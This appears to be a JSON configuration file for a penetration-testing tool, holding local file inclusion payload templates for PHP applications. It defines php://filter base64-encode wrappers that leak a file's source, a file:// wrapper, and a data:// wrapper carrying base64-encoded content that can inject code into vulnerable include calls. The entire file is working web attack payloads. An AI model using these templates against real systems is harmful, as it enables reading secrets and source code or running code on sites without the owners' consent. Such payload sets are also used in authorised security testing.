{
    "name": "lfi",
    "payload": {
        "base64":{
            "number": 1,
            "template": "php://filter/read=convert.base64-encode/resource={{0}}"
        },
        "b64":{
            "number": 1,
            "template": "php://filter/read=convert.base64-encode/resource={{0}}"
        },
        "file":{
            "number": 1,
            "template": "file://{{0}}"
        },
        "data":{
            "number": 1,
            "template": "data://text/plain;base64,{{0}}",
            "encoding": {
                "0": "base64"
            }
        }
    }
}